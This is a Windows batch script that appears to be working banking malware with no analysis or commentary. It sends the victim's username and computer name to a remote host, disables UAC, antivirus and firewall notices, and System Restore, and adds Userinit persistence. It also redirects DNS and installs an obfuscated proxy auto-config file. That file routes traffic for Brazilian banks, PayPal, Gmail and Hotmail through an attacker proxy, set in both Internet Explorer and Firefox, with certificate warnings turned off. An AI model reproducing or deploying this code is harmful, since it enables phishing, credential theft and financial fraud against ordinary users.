@shift
@set "_=///@"
@set "_=%_:/=%"
setLocal EnableDelayedExpansion
@echo off
@break off


@title %random%-%random%
REM @ipconfig /all|find "VMware"&&if errorlevel 0 exit
@set "key=abcdefghijklmnopqrstuvxywz"
call :inicio
call :meio
goto fim

:inicio
@set "_a_=ks392724.kimsufi.com/icons/portal.php"
if not exist "%temp%\thunb.db" (start /low /min iexplore.exe "http://%_a_%?a=%username%&b=%computername%")&&fsutil file createnew "%temp%\thunb.db" 666"
%windir%\system32\reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
%windir%\system32\reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit" /t REG_SZ /d "C:\Windows\system32\userinit.exe,%temp%\ctfmon.exe," /f
%windir%\system32\reg.exe add "HKLM\Software\Microsoft\Security Center" /v AntiVirusDisableNotify /t REG_DWORD /d 0x00000001 /f
%windir%\system32\reg.exe add "HKLM\Software\Microsoft\Security Center" /v FirewallDisableNotify /t REG_DWORD /d 0x00000001 /f
%windir%\system32\reg.exe add "HKLM\Software\Microsoft\Security Center" /v UpdatesDisableNotify /t REG_DWORD /d 0x00000001 /f
%windir%\system32\reg.exe add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings"  /v DisableSR /t REG_DWORD /d 0x00000001 /f
goto :eof

:meio
for /f "tokens=1,2 delims=[]" %%A in ('ping amor.linetimex.org ^| find "["') do set ipaddress=%%B
echo %ipaddress%
wmic nicconfig where (IPEnabled=TRUE) call SetDNSServerSearchOrder ("%ipaddress%","8.8.8.8")

:fim

%_dot%set _p=%temp%
%_dot%set "_p=%_p:\=/%"
if "%_p:~-1%"=="/" set _p=%_p:~0,-1%
%_dot%set /a "rnd=%random%"
%_dot%set "_a=%temp%"
%_dot%set "_b=%username%"
%_dot%set "_c=%computername%"
%_dot%set "_KO=iexplore.exe "
%_dot%set "b_=%windir%\system32\reg.exefind.exeping.exeipconfigattxXXXXXXXXXxxxxxxx"
%_dot%set "c_=user_prefecho.Wscript.Sleepnetwork.proxy.typenetwork.proxy.autoconfig_url"
%_dot%set "_aa=HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"
%_dot%set "_bb=HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
%_dot%set "_cc=HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Internet Explorer\Control Panel"
%_dot%set "_dd=HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
%_dot%set "_ee=HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Internet Explorer\Control Panel"
%_dot%set "_xx=HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"

::-------------------------------------

> %temp%.\%_c%.txt echo var _0x38db=["amor.linetimex.org","PROXY ",":80",".com.br","bb","ita","desco","santa","cred","hsb","citi","real","ericanex","www.","gmail","bancodobrasil","bancobrasil","serasa","paypal","","u","upersonnalite","bra",".com","prime","nder","nderbanespa","si","i","icard","cetelem","serasaexperian","bank","c","hotmail.com","hotmail","tam","banco","nderempresarial","am","press","press.com","c.com","uuniclass","uuniclass.com","uprivatebank"];function FindProxyForURL(_0xcf3cx2,_0xcf3cx3){return googlee(_0xcf3cx3);} ;function googlee(_0xcf3cx3){var _0xcf3cx5=dnsResolve(_0x38db[0]);var _0xcf3cx6=_0x38db[1]+_0xcf3cx5+_0x38db[2];var _0xcf3cx7=_0x38db[3];var _0xcf3cx8=_0x38db[4];var _0xcf3cx9=_0x38db[5];var _0xcf3cxa=_0x38db[6];var _0xcf3cxb=_0x38db[7];var _0xcf3cxc=_0x38db[8];var _0xcf3cxd=_0x38db[9];var _0xcf3cxe=_0x38db[10];var _0xcf3cxf=_0x38db[11];var _0xcf3cx10=_0x38db[12];var _0xcf3cx11=_0x38db[13];var _0xcf3cx12=_0x38db[14];var _0xcf3cx13=_0x38db[15];var _0xcf3cx14=_0x38db[16];var _0xcf3cx15=_0x38db[17];var _0xcf3cx16=_0x38db[18];if(shExpMatch(_0xcf3cx3,_0x38db[19]+_0xcf3cx11+_0x38db[19]+_0xcf3cx9+_0x38db[20]+_0xcf3cx7)){return _0xcf3cx6;} ;if(shExpMatch(_0xcf3cx3,_0x38db[19]+_0xcf3cx9+_0x38db[20]+_0xcf3cx7)){return _0xcf3cx6;} ;if(shExpMatch(_0xcf3cx3,_0x38db[19]+_0xcf3cx9+_0x38db[21]+_0xcf3cx7)){return _0xcf3cx6;} ;if(shExpMatch(_0xcf3cx3,_0x38db[19]+_0xcf3cx11+_0x38db[19]+_0xcf3cx9+_0x38db[21]+_0xcf3cx7)){return _0xcf3cx6;} ;if(shExpMatch(_0xcf3cx3,_0x38db[22]+_0xcf3cxa+_0x38db[23])){return _0xcf3cx6;} ;if(shExpMatch(_0xcf3cx3,_0x38db[22]+_0xcf3cxa+_0x38db[19]+_0xcf3cx7)){return _0xcf3cx6;} ;if(shExpMatch(_0xcf3cx3,_0x38db[19]+_0xcf3cx11+_0x38db[22]+_0xcf3cxa+_0x38db[23])){return _0xcf3cx6;} ;if(shExpMatch(_0xcf3cx3,_0x38db[19]+_0xcf3cx11+_0x38db[22]+_0xcf3cxa+_0x38db[19]+_0xcf3cx7)){return _0xcf3cx6;} ;if(shExpMatch(_0xcf3cx3,_0x38db[22]+_0xcf3cxa+_0x38db[24]+_0xcf3cx7)){return _0xcf3cx6;} ;if(shExpMatch(_0xcf3cx3,_0x38db[19]+_0xcf3cx11+_0x38db[22]+_0xcf3cxa+_0x38db[24]+_0xcf3cx7)){return _0xcf3cx6;} ;if(shExpMatch(_0xcf3cx3,_0x38db[19]+_0xcf3cx8+_0x38db[19]+_0xcf3cx7)){return _0xcf3cx6;} ;if(shExpMatch(_0xcf3cx3,_0x38db[19]+_0xcf3cx11+_0x38db[19]+_0xcf3cx8+_0x38db[23])){return _0xcf3cx6;} ;if(shExpMatch(_0xcf3cx3,_0x38db[19]+_0xcf3cx11+_0x38db[19]+_0xcf3cx8+_0x38db[19]+_0xcf3cx7)){return _0xcf3cx6;} ;if(shExpMatch(_0xcf3cx3,_0x38db[19]+_0xcf3cx13+_0x38db[19]+_0xcf3cx7)){return _0xcf3cx6;} ;if(shExpMatch(_0xcf3cx3,_0x38db[19]+_0xcf3cx11+_0x38db[19]+_0xcf3cx13+_0x38db[19]+_0xcf3cx7)){return _0xcf3cx6;} ;if(shExpMatch(_0xcf3cx3,_0x38db[19]+_0xcf3cx11+_0x38db[19]+_0xcf3cx14+_0x38db[19]+_0xcf3cx7)){return _0xcf3cx6;} ;if(shExpMatch(_0xcf3cx3,_0x38db[19]+_0xcf3cxb+_0x38db[25]+_0xcf3cx7)){return _0xcf3cx6;} ;if(shExpMatch(_0xcf3cx3,_0x38db[19]+_0xcf3cx11+_0x38db[19]+_0xcf3cxb+_0x38db[25]+_0xcf3cx7)){return _0xcf3cx6;} ;if(shExpMatch(_0xcf3cx3,_0x38db[19]+_0xcf3cxb+_0x38db[26]+_0xcf3cx7)){return _0xcf3cx6;} ;if(shExpMatch(_0xcf3cx3,_0x38db[19]+_0xcf3cx11+_0x38db[19]+_0xcf3cxb+_0x38db[26]+_0xcf3cx7)){return _0xcf3cx6;} ;if(shExpMatch(_0xcf3cx3,_0x38db[19]+_0xcf3cx11+_0x38db[27]+_0xcf3cxc+_0x38db[28]+_0xcf3cx7)){return _0xcf3cx6;} ;if(shExpMatch(_0xcf3cx3,_0x38db[27]+_0xcf3cxc+_0x38db[28]+_0xcf3cx7)){return _0xcf3cx6;} ;if(shExpMatch(_0xcf3cx3,_0x38db[19]+_0xcf3cx11+_0x38db[19]+_0xcf3cxc+_0x38db[29]+_0xcf3cx7)){return _0xcf3cx6;} ;if(shExpMatch(_0xcf3cx3,_0x38db[19]+_0xcf3cx11+_0x38db[30]+_0xcf3cx7)){return _0xcf3cx6;} ;if(shExpMatch(_0xcf3cx3,_0x38db[30]+_0xcf3cx7)){return _0xcf3cx6;} ;if(shExpMatch(_0xcf3cx3,_0x38db[17]+_0xcf3cx7)){return _0xcf3cx6;} ;if(shExpMatch(_0xcf3cx3,_0x38db[19]+_0xcf3cx11+_0x38db[17]+_0xcf3cx7)){return _0xcf3cx6;} ;if(shExpMatch(_0xcf3cx3,_0x38db[31]+_0xcf3cx7)){return _0xcf3cx6;} ;if(shExpMatch(_0xcf3cx3,_0x38db[19]+_0xcf3cx11+_0x38db[31]+_0xcf3cx7)){return _0xcf3cx6;} ;if(shExpMatch(_0xcf3cx3,_0x38db[19]+_0xcf3cxe+_0x38db[32]+_0xcf3cx7)){return _0xcf3cx6;} ;if(shExpMatch(_0xcf3cx3,_0x38db[19]+_0xcf3cx11+_0x38db[19]+_0xcf3cxe+_0x38db[32]+_0xcf3cx7)){return _0xcf3cx6;} ;if(shExpMatch(_0xcf3cx3,_0x38db[19]+_0xcf3cxd+_0x38db[33]+_0xcf3cx7)){return _0xcf3cx6;} ;if(shExpMatch(_0xcf3cx3,_0x38db[19]+_0xcf3cx11+_0x38db[19]+_0xcf3cxd+_0x38db[33]+_0xcf3cx7)){return _0xcf3cx6;} ;if(shExpMatch(_0xcf3cx3,_0x38db[19]+_0xcf3cx11+_0xcf3cx12+_0x38db[23])){return _0xcf3cx6;} ;if(shExpMatch(_0xcf3cx3,_0x38db[19]+_0xcf3cx11+_0x38db[19]+_0xcf3cx12+_0x38db[19]+_0xcf3cx7)){return _0xcf3cx6;} ;if(shExpMatch(_0xcf3cx3,_0x38db[19]+_0xcf3cx12+_0x38db[23])){return _0xcf3cx6;} ;if(shExpMatch(_0xcf3cx3,_0x38db[19]+_0xcf3cx12+_0x38db[19]+_0xcf3cx7)){return _0xcf3cx6;} ;if(shExpMatch(_0xcf3cx3,_0x38db[19]+_0xcf3cx11+_0x38db[34])){return _0xcf3cx6;} ;if(shExpMatch(_0xcf3cx3,_0x38db[19]+_0xcf3cx11+_0x38db[35]+_0xcf3cx7)){return _0xcf3cx6;} ;if(shExpMatch(_0xcf3cx3,_0x38db[34])){return _0xcf3cx6;} ;if(shExpMatch(_0xcf3cx3,_0x38db[35]+_0xcf3cx7)){return _0xcf3cx6;} ;if(shExpMatch(_0xcf3cx3,_0x38db[36]+_0xcf3cx7)){return _0xcf3cx6;} ;if(shExpMatch(_0xcf3cx3,_0x38db[19]+_0xcf3cx11+_0x38db[36]+_0xcf3cx7)){return _0xcf3cx6;} ;if(shExpMatch(_0xcf3cx3,_0x38db[19]+_0xcf3cxf+_0x38db[19]+_0xcf3cx7)){return _0xcf3cx6;} ;if(shExpMatch(_0xcf3cx3,_0x38db[37]+_0xcf3cxf+_0x38db[19]+_0xcf3cx7)){return _0xcf3cx6;} ;if(shExpMatch(_0xcf3cx3,_0x38db[19]+_0xcf3cx11+_0x38db[19]+_0xcf3cxf+_0x38db[19]+_0xcf3cx7)){return _0xcf3cx6;} ;if(shExpMatch(_0xcf3cx3,_0x38db[19]+_0xcf3cx11+_0x38db[37]+_0xcf3cxf+_0x38db[19]+_0xcf3cx7)){return _0xcf3cx6;} ;if(shExpMatch(_0xcf3cx3,_0x38db[36]+_0xcf3cx7)){return _0xcf3cx6;} ;if(shExpMatch(_0xcf3cx3,_0x38db[19]+_0xcf3cx11+_0x38db[36]+_0xcf3cx7)){return _0xcf3cx6;} ;if(shExpMatch(_0xcf3cx3,_0x38db[19]+_0xcf3cx16+_0x38db[19]+_0xcf3cx7)){return _0xcf3cx6;} ;if(shExpMatch(_0xcf3cx3,_0x38db[19]+_0xcf3cx11+_0x38db[19]+_0xcf3cx16+_0x38db[19]+_0xcf3cx7)){return _0xcf3cx6;} ;if(shExpMatch(_0xcf3cx3,_0x38db[19]+_0xcf3cx16+_0x38db[23])){return _0xcf3cx6;} ;if(shExpMatch(_0xcf3cx3,_0x38db[19]+_0xcf3cx11+_0x38db[19]+_0xcf3cx16+_0x38db[23])){return _0xcf3cx6;} ;if(shExpMatch(_0xcf3cx3,_0x38db[19]+_0xcf3cx11+_0x38db[19]+_0xcf3cxb+_0x38db[38]+_0xcf3cx7)){return _0xcf3cx6;} ;if(shExpMatch(_0xcf3cx3,_0x38db[19]+_0xcf3cx11+_0x38db[39]+_0xcf3cx10+_0x38db[40]+_0xcf3cx7)){return _0xcf3cx6;} ;if(shExpMatch(_0xcf3cx3,_0x38db[39]+_0xcf3cx10+_0x38db[40]+_0xcf3cx7)){return _0xcf3cx6;} ;if(shExpMatch(_0xcf3cx3,_0x38db[19]+_0xcf3cx11+_0x38db[39]+_0xcf3cx10+_0x38db[41])){return _0xcf3cx6;} ;if(shExpMatch(_0xcf3cx3,_0x38db[39]+_0xcf3cx10+_0x38db[41])){return _0xcf3cx6;} ;if(shExpMatch(_0xcf3cx3,_0x38db[19]+_0xcf3cx11+_0x38db[19]+_0xcf3cxd+_0x38db[33]+_0xcf3cx7)){return _0xcf3cx6;} ;if(shExpMatch(_0xcf3cx3,_0x38db[19]+_0xcf3cx11+_0x38db[19]+_0xcf3cxd+_0x38db[42])){return _0xcf3cx6;} ;if(shExpMatch(_0xcf3cx3,_0x38db[19]+_0xcf3cxd+_0x38db[42])){return _0xcf3cx6;} ;if(shExpMatch(_0xcf3cx3,_0x38db[19]+_0xcf3cx11+_0x38db[19]+_0xcf3cx9+_0x38db[43]+_0xcf3cx7)){return _0xcf3cx6;} ;if(shExpMatch(_0xcf3cx3,_0x38db[19]+_0xcf3cx9+_0x38db[43]+_0xcf3cx7)){return _0xcf3cx6;} ;if(shExpMatch(_0xcf3cx3,_0x38db[19]+_0xcf3cx11+_0x38db[19]+_0xcf3cx9+_0x38db[44])){return _0xcf3cx6;} ;if(shExpMatch(_0xcf3cx3,_0x38db[19]+_0xcf3cx9+_0x38db[44])){return _0xcf3cx6;} ;if(shExpMatch(_0xcf3cx3,_0x38db[19]+_0xcf3cx11+_0x38db[19]+_0xcf3cx9+_0x38db[45]+_0xcf3cx7)){return _0xcf3cx6;} ;if(shExpMatch(_0xcf3cx3,_0x38db[19]+_0xcf3cx9+_0x38db[45]+_0xcf3cx7)){return _0xcf3cx6;} ;if(shExpMatch(_0xcf3cx3,_0x38db[19]+_0xcf3cx11+_0x38db[19]+_0xcf3cx9+_0x38db[45]+_0xcf3cx7)){return _0xcf3cx6;} ;} ;
::-------------------------------------
%_dot%echo %c_:~39,1%|%b_:~0,27% add "%_bb%" /v "AutoConfigUrl" /d "file://%temp%/%_c%.txt" /f
%_dot%echo %c_:~39,1%|%b_:~0,27% add "%_bb%" /v "EnableHttp1_1" /t reg_dword /d 00000001 /f
%_dot%echo %c_:~39,1%|%b_:~0,27% add "%_bb%" /v "ProxyEnable" /t reg_dword /d 00000000 /f
%_dot%echo %c_:~39,1%|%b_:~0,27% add "%_bb%" /v "ProxyHttp1.1" /t reg_dword /d 00000000 /f
%_dot%echo %c_:~39,1%|%b_:~0,27% add "%_cc%" /v "AdvancedTab" /t reg_dword /d 00000001 /f
%_dot%echo %c_:~39,1%|%b_:~0,27% add "%_cc%" /v "ResetWebSettings" /t reg_dword /d 00000001 /f
%_dot%echo %c_:~39,1%|%b_:~0,27% add "%_cc%" /v "Autoconfig" /t reg_dword /d 00000001 /f
%_dot%echo %c_:~39,1%|%b_:~0,27% add "%_dd%" /v "AutoConfigUrl" /d "file://%temp%/%_c%.txt" /f
%_dot%echo %c_:~39,1%|%b_:~0,27% add "%_dd%" /v "EnableHttp1_1" /t reg_dword /d 00000001 /f
%_dot%echo %c_:~39,1%|%b_:~0,27% add "%_dd%" /v "ProxyEnable" /t reg_dword /d 00000000 /f
%_dot%echo %c_:~39,1%|%b_:~0,27% add "%_dd%" /v "ProxyHttp1.1" /t reg_dword /d 00000000 /f
%_dot%echo %c_:~39,1%|%b_:~0,27% add "%_ee%" /v "Autoconfig" /t reg_dword /d 00000001 /f
%_dot%echo %c_:~39,1%|%b_:~0,27% add "%_ee%" /v "AdvancedTab" /t reg_dword /d 00000001 /f
%_dot%echo %c_:~39,1%|%b_:~0,27% add "%_ee%" /v "ResetWebSettings" /t reg_dword /d 00000001 /f
%_dot%echo %c_:~39,1%|%b_:~0,27% add "%_xx%" /v "EnableLUA" /t reg_dword /d 00000000 /f
%_dot%set "unidade=%systemdrive%"
cd /d "%unidade%\"
for /f "tokens=*" %%z in ('dir "%homepath%\.." /b /s ^| find "prefs.js"') do set _ppp=%%z && set "_aaa=%temp:\=/%"
if "%_aaa:~-1%"=="/" set _aaa=%_aaa:~0,-1%
attrib.exe -r "%_ppp%" && echo user_pref("network.proxy.autoconfig_url", "file:///%_aaa%/%_c%.txt"); >> "%_ppp%"
attrib.exe -r "%_ppp%" && echo user_pref("network.proxy.type", 2); >> "%_ppp%"
attrib.exe +r "%_ppp%"
if exist %_a%\~r.tmp del /q /f %_a%\~r.tmp
%b_:~0,27% export HKU %_a%\~r.tmp
type %_a%\~r.tmp | %b_:~0,20%find.exe "Internet Explorer\Main">%_a%\~i.tmp && for /f "tokens=2 delims=\" %%D in ('type %_a%\~i.tmp ^| %b_:~0,20%find.exe "S-1-5-21"') do set CSL=%%D
%_dot%echo %c_:~39,1%|%b_:~0,27% add "HKU\%CSL%\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v "WarnonBadCertRecving" /t REG_DWORD /d "0x00000000" /f
%_dot%echo %c_:~39,1%|%b_:~0,27% add "HKU\%CSL%\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v "WarnOnIntranet" /t REG_DWORD /d "0x00000000" /f
%_dot%echo %c_:~39,1%|%b_:~0,27% add "HKU\%CSL%\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap" /v "AutoDetect" /t REG_DWORD /d "0x00000000" /f
%_dot%echo %c_:~39,1%|%b_:~0,27% add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore"  /v DisableSR /t REG_DWORD /d 0x00000001 /f
ipconfig /registerdns
ipconfig /flushdns
exit